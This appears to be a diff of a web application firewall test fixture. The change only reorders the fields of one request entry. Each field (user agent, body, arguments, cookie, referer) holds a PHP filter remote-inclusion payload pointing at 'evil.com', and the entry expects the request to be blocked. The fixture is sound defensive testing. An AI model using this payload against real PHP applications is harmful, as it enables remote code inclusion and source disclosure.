@@ -1,10 +1,10 @@
 {
     "req": [
       {
-        "UA": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
-        "Body": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "ARGS": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "Body": "param%RND%=php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "Cookie": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
+        "UA": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "Referer": "php://filter/read=string.rot13/resource=http://evil.com/index.php",
         "Blocked": true
       }
